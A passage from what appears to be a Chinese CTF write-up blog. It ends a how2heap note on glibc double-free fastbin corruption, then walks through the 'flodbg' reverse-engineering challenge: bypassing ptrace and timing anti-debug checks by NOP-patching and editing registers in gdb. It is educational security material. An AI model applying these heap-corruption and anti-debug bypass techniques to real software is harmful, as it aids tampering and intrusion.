class="line">Fastbins[idx=<span class="number">4</span>, size=<span class="number">0x28</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">5</span>, size=<span class="number">0x30</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">6</span>, size=<span class="number">0x38</span>] <span class="number">0x00</span></span><br><span class="line">──────────────────────────────── Unsorted Bin for arena 'main_arena' ────────────────────────────────</span><br><span class="line">[+] Found <span class="number">0</span> chunks in unsorted bin.</span><br><span class="line">───────────────────────────────── Small Bins for arena 'main_arena' ─────────────────────────────────</span><br><span class="line">[+] Found <span class="number">0</span> chunks in <span class="number">0</span> small non-empty bins.</span><br><span class="line">───────────────────────────────── Large Bins for arena 'main_arena' ─────────────────────────────────</span><br><span class="line">[+] Found <span class="number">0</span> chunks in <span class="number">0</span> large non-empty bins.</span><br></pre></td></tr></table></figure><p>第二次free，b已经并入了fastbin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap bin</span><br><span class="line">[+] No Tcache in <span class="keyword">this</span> version of libc</span><br><span class="line">─────────────────────────────────── Fastbins <span class="keyword">for</span> arena <span class="number">0xf7fb2780</span> ───────────────────────────────────</span><br><span class="line">Fastbins[idx=<span class="number">0</span>, size=<span class="number">0x8</span>]  ←  Chunk(addr=<span class="number">0x804b018</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE)  ←  Chunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE) </span><br><span class="line">Fastbins[idx=<span class="number">1</span>, size=<span class="number">0x10</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">2</span>, size=<span class="number">0x18</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">3</span>, size=<span class="number">0x20</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">4</span>, size=<span class="number">0x28</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">5</span>, size=<span class="number">0x30</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">6</span>, size=<span class="number">0x38</span>] <span class="number">0x00</span></span><br></pre></td></tr></table></figure><p>再一次free a，可以发现fastbin里面出现了两次a</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap bin</span><br><span class="line">[+] No Tcache in <span class="keyword">this</span> version of libc</span><br><span class="line">─────────────────────────────────── Fastbins <span class="keyword">for</span> arena <span class="number">0xf7fb2780</span> ───────────────────────────────────</span><br><span class="line">Fastbins[idx=<span class="number">0</span>, size=<span class="number">0x8</span>]  ←  Chunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE)  ←  Chunk(addr=<span class="number">0x804b018</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE)  ←  Chunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x10</span>, flags=PREV_INUSE)  →  [loop detected]</span><br><span class="line">Fastbins[idx=<span class="number">1</span>, size=<span class="number">0x10</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">2</span>, size=<span class="number">0x18</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">3</span>, size=<span class="number">0x20</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">4</span>, size=<span class="number">0x28</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">5</span>, size=<span class="number">0x30</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">6</span>, size=<span class="number">0x38</span>] <span class="number">0x00</span></span><br></pre></td></tr></table></figure><h4 id="Double-Free漏洞原理"><a href="#Double-Free漏洞原理" class="headerlink" title="Double Free漏洞原理"></a>Double Free漏洞原理</h4><ul><li>对一个指向<strong>malloc</strong>分配的<strong>heap</strong>内存的指针<strong>p</strong>进行<strong>free</strong>之后，并没有将该指针置<strong>NULL</strong>。导致，即使<strong>free</strong>之后指针<strong>p</strong>仍然指向<strong>heap</strong>内存，潜在着利用的可能。</li></ul><h4 id="利用基础"><a href="#利用基础" class="headerlink" title="利用基础"></a>利用基础</h4><ul><li><p>在堆漏洞利用里，很多都是基于触发<strong>unlink</strong>来实现任意代码执行的，<strong>double free</strong>也是基于此</p></li><li><p>不同于<strong>unlink</strong>的是，<strong>unlink</strong>是利用溢出来伪造<strong>chunk</strong>，实现<strong>unlink</strong>的。而<strong>double  free</strong>则一般是需要至少获得三个连续的<strong>chunk</strong>，再全部<strong>free</strong>。之后再重新分配两个大<strong>chunk</strong>（能够覆盖前面<strong>free</strong>的三个<strong>chunk</strong>），通过伪造<strong>p</strong>（利用绕过<strong>unlink</strong>的检查的技术伪造）<strong>chunk</strong>和一个引导触发<strong>unlink</strong>的<strong>chunk</strong>即可。构造如下图</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/CTF%E2%80%94%E2%80%94WriteUP/how2heap/1.png" alt></p></li></ul><p>注意，伪造的数据中fake_size 应该等于 fake_pre_size2+1。以满足大小一致检查</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>巅峰极客——flodbg</title>
      <link href="/2019/10/27/%C3%9F%E2%96%88%E2%95%96%CF%83%E2%95%9D%C2%BD%E2%94%90%E2%95%90%C3%AD%C2%AC%C3%AD%C2%ACflodbg/"/>
      <url>/2019/10/27/%C3%9F%E2%96%88%E2%95%96%CF%83%E2%95%9D%C2%BD%E2%94%90%E2%95%90%C3%AD%C2%AC%C3%AD%C2%ACflodbg/</url>
      
        <content type="html"><![CDATA[<p>检查一下程序</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:/mnt/hgfs/share/巅峰极客/flodbg$ checksec flodbg</span><br><span class="line">[*] '/mnt/hgfs/share/\xe5\xb7\x85\xe5\xb3\xb0\xe6\x9e\x81\xe5\xae\xa2/flodbg/flodbg'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>拿到程序发现运行发现一直没有结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:/mnt/hgfs/share/巅峰极客/flodbg$ ./flodbg</span><br></pre></td></tr></table></figure><p> 直接IDA Pro打开分析一下函数流程</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// er12</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v7; <span class="comment">// [rsp-8h] [rbp-4E0h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp-8h] [rbp-4E0h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+0h] [rbp-4D8h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+14h] [rbp-4C4h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+4Ch] [rbp-48Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+50h] [rbp-488h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+54h] [rbp-484h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+58h] [rbp-480h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+5Ch] [rbp-47Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+60h] [rbp-478h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+64h] [rbp-474h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+68h] [rbp-470h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [rsp+6Ch] [rbp-46Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [rsp+70h] [rbp-468h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+74h] [rbp-464h]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [rsp+78h] [rbp-460h]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [rsp+7Ch] [rbp-45Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [rsp+80h] [rbp-458h]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [rsp+84h] [rbp-454h]</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [rsp+88h] [rbp-450h]</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// [rsp+8Ch] [rbp-44Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [rsp+90h] [rbp-448h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+94h] [rbp-444h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [rsp+98h] [rbp-440h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v31; <span class="comment">// [rsp+4A8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="keyword">char</span> *)&amp;v9;</span><br><span class="line">  v31 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = time(<span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">    *((_DWORD *)v3 - <span class="number">1</span>) = _IO_getc(_bss_start);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 != &amp;v11 );</span><br><span class="line">  v12 = <span class="string">'S'</span>;</span><br><span class="line">  v13 = <span class="string">'@'</span>;</span><br><span class="line">  v14 = <span class="string">'y'</span>;</span><br><span class="line">  v15 = <span class="string">'R'</span>;</span><br><span class="line">  v16 = <span class="string">'t'</span>;</span><br><span class="line">  v17 = <span class="string">'f'</span>;</span><br><span class="line">  v18 = <span class="string">'T'</span>;</span><br><span class="line">  v19 = <span class="string">'l'</span>;</span><br><span class="line">  v20 = <span class="string">'0'</span>;</span><br><span class="line">  v21 = <span class="string">'+'</span>;</span><br><span class="line">  v22 = <span class="string">'a'</span>;</span><br><span class="line">  v23 = <span class="string">'g'</span>;</span><br><span class="line">  v24 = <span class="string">'-'</span>;</span><br><span class="line">  v25 = <span class="string">'L'</span>;</span><br><span class="line">  v26 = <span class="string">'_'</span>;</span><br><span class="line">  v27 = <span class="string">'3'</span>;</span><br><span class="line">  v28 = <span class="string">'M'</span>;</span><br><span class="line">  v29 = <span class="string">'&#125;'</span>;</span><br><span class="line">  v30 = <span class="string">'&#123;'</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ptrace(<span class="number">0</span>, <span class="number">0L</span>L, <span class="number">1L</span>L, <span class="number">0L</span>L) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="keyword">unsigned</span> __int64)time(<span class="number">0L</span>L) - v4;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      func3(&amp;v10, <span class="number">2L</span>L, <span class="number">7L</span>L, <span class="number">14L</span>L);</span><br><span class="line">      v7 = <span class="number">4196782L</span>L;</span><br><span class="line">      JUMPOUT(__CS__, v8 + <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(v5);</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="number">10000000</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">    --v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 );</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让我们长期等待无响应的代码是因为这段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v6 = <span class="number">10000000</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">    --v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 );</span><br></pre></td></tr></table></figure><p>然后注意到这里有一个<strong>ptrace</strong>函数，且调用的是<strong>ptrace</strong>函数，所以这个程序是加入了反调试的功能的。 <strong>ptrace</strong>函数提供了父进程观察和控制其子进程执行的能力，发送给被跟踪的子进程的信号(除了<strong>SIGKILL</strong>)，都会被转发给父进程，这也是调试器主要原理。 总而言之就是如果我们使用GDB调试这个程序，<strong>ptrace</strong>函数执行成功就会返回大于0的值，那么程序就会中止</p><p>这里还存在一个反调试方式就是时间戳的检查</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v4 = time(<span class="number">0L</span>L);</span><br><span class="line">v5 = (<span class="keyword">unsigned</span> __int64)time(<span class="number">0L</span>L) - v4;</span><br></pre></td></tr></table></figure><p>被调试时，进程的运行速度大大降低，例如，单步调试大幅降低恶意代码的运行速度，所以时钟检测是恶意代码探测调试器存在的最常用方式之一。有如下两种用时钟检测来探测调试器存在的方法。记录一段操作前后的时间戳，然后比较这两个时间戳，如果存在滞后，则可以认为存在调试器。记录触发一个异常前后的时间戳。如果不调试进程，可以很快处理完异常，因为调试器处理异常的速度非常慢。默认情况下，调试器处理异常时需要人为干预，这导致大量延迟。虽然很多调试器允许我们忽略异常，将异常直接返回程序，但这样操作仍然存在不小的延迟</p><p>然后我们看这段代码使用了花指令来混淆</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JUMPOUT(__CS__, v8 + <span class="number">10</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004009</span>C4                 dd <span class="number">48</span>EBEBEBh</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">11B</span>908247C8Dh, <span class="number">4B</span>E00000006BA00h, <span class="number">440E8000000</span>h, <span class="number">0</span>EBB866C8FFC0FFEBh</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0</span>EB90EBFA74C03105h, <span class="number">0F</span>FC0FFEBC8FFC0FFh, <span class="number">8</span>D48C8FFC0FFEBC8h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0</span>AB924247Ch, <span class="number">3B</span>E00000005BAh, <span class="number">0E800000409</span>E80000h, <span class="number">24B</span>48D48FFFFFE04h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">75E8</span>C789000000A0h, <span class="number">0F</span>C589C085000004h, <span class="number">5</span>C8D480000020B85h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0B</span>A0000000FB92C24h, <span class="number">6B</span>E00000009h, <span class="number">3</span>CFE8E7894800h, <span class="number">6B</span>A00000008B900h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">3B</span>E000000h, <span class="number">3B</span>8E8DF8948h, <span class="number">89F</span>FFFFD71E8FF31h, <span class="number">0F</span>02FF83E72944C7h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0</span>EB9000001D48Fh, <span class="number">0B</span>E00000005BA0000h, <span class="number">0E8</span>EF894C00000001h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0F</span>FFCF7E80000038Ch, <span class="number">0F</span>FFFFD10E8C789FFh, <span class="number">0F</span>FFFFD78E8C58941h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">1</span>AA850FC53941h, <span class="number">13B</span>9F63100h, <span class="number">0E7894800000002</span>BAh, <span class="number">356E840246</span>C8D4Ch</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0</span>C03105EBB8660000h, <span class="number">0F</span>FC0FFEB90EBFA74h, <span class="number">0</span>C03105EBB86690C8h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0</span>C8FFC0FFEBEBFA74h, <span class="number">10B</span>90C247C8D48h, <span class="number">0B</span>E00000005BA0000h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">31F</span>E800000003h, <span class="number">4B</span>93C247C8D4800h, <span class="number">3B</span>A000000h, <span class="number">306E800000001</span>BEh</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0</span>C8FFC0FFEB900000h, <span class="number">0</span>C03105EBB8669090h, <span class="number">5</span>EBB86690EBFA74h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">909090</span>EBFA74C031h, <span class="number">0B</span>B920247C8D48h, <span class="number">0B</span>E00000006BA0000h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">2</span>CFE800000003h, <span class="number">13B</span>9F63100h, <span class="number">0E7894800000007</span>BAh, <span class="number">0E89090000002</span>BBE8h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0</span>C083485800000000h, <span class="number">0</span>EBEBEBEBEBE0FF0Ch, <span class="number">74</span>C03105EBB86690h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">3B</span>9F63190EBFAh, <span class="number">4</span>C00000002BA0000h, <span class="number">4800000289E8</span>EF89h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">9B</span>9F63128247C8Dh, <span class="number">2B</span>A000000h, <span class="number">0E8</span>FF3100000273E8h, <span class="number">2944</span>C789FFFFFC2Ch</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">8F</span>8F0F03FF83E7h, <span class="number">8B</span>9DF89480000h, <span class="number">0B</span>E00000003BA0000h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">45E8</span>DB3100000001h, <span class="number">3B</span>9000002h, <span class="number">4</span>CF63100000002BAh, <span class="number">0B</span>800000231E8EF89h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">2E660</span>EEB00000053h, <span class="number">841F</span>0Fh, <span class="number">759</span>C043B509C448Bh, <span class="number">0F</span>B834801C383483Chc</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">400F</span>FDBFED7513h, <span class="number">948B</span>48FFFFFB63E8h, <span class="number">334864000004</span>A824h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0E889000000282514</span>h, <span class="number">4B</span>8C481482475h, <span class="number">0</span>C35D415C415D5B00h</span><br><span class="line">.text:<span class="number">00000000004009</span>C8                 dq <span class="number">0F</span>F2BFD8EBFFCD83h, <span class="number">89F</span>FFFFB31E80040h</span><br><span class="line">.text:<span class="number">0000000000400</span>C50                 db <span class="number">0</span>DFh</span><br></pre></td></tr></table></figure><p>我们绕过这些反调试的手法可以直接path掉或者在动态调试的时候通过直接修改寄存器绕过即可，我们首先来通过path修改绕过<strong>ptrace</strong>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000040096</span>A                 call    _ptrace</span><br></pre></td></tr></table></figure><p>变成</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000040096</span>A                 nop                     ; Keypatch modified <span class="keyword">this</span> from:</span><br><span class="line">.text:<span class="number">000000000040096</span>A                                         ;   call _ptrace</span><br><span class="line">.text:<span class="number">000000000040096</span>A                                         ; Keypatch padded NOP to next boundary: <span class="number">4</span> bytes</span><br><span class="line">.text:<span class="number">000000000040096B</span>                 nop</span><br><span class="line">.text:<span class="number">000000000040096</span>C                 nop</span><br><span class="line">.text:<span class="number">000000000040096</span>D                 nop</span><br><span class="line">.text:<span class="number">000000000040096</span>E                 nop</span><br></pre></td></tr></table></figure><p>在gdb动态调试中可以发现已经成功绕过</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────[ DISASM ]────────────────────────────────────────</span><br><span class="line">   <span class="number">0x400933</span> &lt;main+<span class="number">211</span>&gt;    mov    dword ptr [rsp + <span class="number">0x88</span>], <span class="number">0x5f</span></span><br><span class="line">   <span class="number">0x40093e</span> &lt;main+<span class="number">222</span>&gt;    mov    dword ptr [rsp + <span class="number">0x8c</span>], <span class="number">0x33</span></span><br><span class="line">   <span class="number">0x400949</span> &lt;main+<span class="number">233</span>&gt;    mov    dword ptr [rsp + <span class="number">0x90</span>], <span class="number">0x4d</span></span><br><span class="line">   <span class="number">0x400954</span> &lt;main+<span class="number">244</span>&gt;    mov    dword ptr [rsp + <span class="number">0x94</span>], <span class="number">0x7d</span></span><br><span class="line">   <span class="number">0x40095f</span> &lt;main+<span class="number">255</span>&gt;    mov    dword ptr [rsp + <span class="number">0x98</span>], <span class="number">0x7b</span></span><br><span class="line"> ► <span class="number">0x40096a</span> &lt;main+<span class="number">266</span>&gt;    nop    </span><br><span class="line">   <span class="number">0x40096b</span> &lt;main+<span class="number">267</span>&gt;    nop    </span><br><span class="line">   <span class="number">0x40096c</span> &lt;main+<span class="number">268</span>&gt;    nop    </span><br><span class="line">   <span class="number">0x40096d</span> &lt;main+<span class="number">269</span>&gt;    nop    </span><br><span class="line">   <span class="number">0x40096e</span> &lt;main+<span class="number">270</span>&gt;    nop    </span><br><span class="line">   <span class="number">0x40096f</span> &lt;main+<span class="number">271</span>&gt;    test   rax, rax</span><br></pre></td></tr></table></figure><p>在这里我们遇到了时间戳检测</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────[ DISASM ]────────────────────────────────────────</span><br><span class="line">   <span class="number">0x400972</span> &lt;main+<span class="number">274</span>&gt;     js     main+<span class="number">1036</span> &lt;<span class="number">0x400c6c</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x400978</span> &lt;main+<span class="number">280</span>&gt;     xor    edi, edi</span><br><span class="line">   <span class="number">0x40097a</span> &lt;main+<span class="number">282</span>&gt;     call   time@plt &lt;<span class="number">0x4007e0</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x40097f</span> &lt;main+<span class="number">287</span>&gt;     mov    edi, eax</span><br><span class="line">   <span class="number">0x400981</span> &lt;main+<span class="number">289</span>&gt;     sub    edi, r12d</span><br><span class="line"> ► <span class="number">0x400984</span> &lt;main+<span class="number">292</span>&gt;     cmp    edi, <span class="number">1</span></span><br><span class="line">   <span class="number">0x400987</span> &lt;main+<span class="number">295</span>&gt;     jg     main+<span class="number">1009</span> &lt;<span class="number">0x400c51</span>&gt;</span><br></pre></td></tr></table></figure><p>我们只需要强制修改edi寄存器的值为1即可以绕过</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> $edi = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>就已经绕过了</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────[ DISASM ]────────────────────────────────────────</span><br><span class="line">   <span class="number">0x40097a</span> &lt;main+<span class="number">282</span>&gt;    call   time@plt &lt;<span class="number">0x4007e0</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x40097f</span> &lt;main+<span class="number">287</span>&gt;    mov    edi, eax</span><br><span class="line">   <span class="number">0x400981</span> &lt;main+<span class="number">289</span>&gt;    sub    edi, r12d</span><br><span class="line">   <span class="number">0x400984</span> &lt;main+<span class="number">292</span>&gt;    cmp    edi, <span class="number">1</span></span><br><span class="line">   <span class="number">0x400987</span> &lt;main+<span class="number">295</span>&gt;    jg     main+<span class="number">1009</span> &lt;<span class="number">0x400c51</span>&gt;</span><br><span class="line"> </span><br><span class="line"> ► <span class="number">0x40098d</span> &lt;main+<span class="number">301</span>&gt;    lea    r13, [rsp + <span class="number">0x14</span>]</span><br></pre></td></tr></table></figure><p>运行到这里</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────[ DISASM ]────────────────────────────────────────</span><br><span class="line">   <span class="number">0x4009a1</span> &lt;main+<span class="number">321</span>&gt;    mov    rdi, r13</span><br><span class="line">   <span 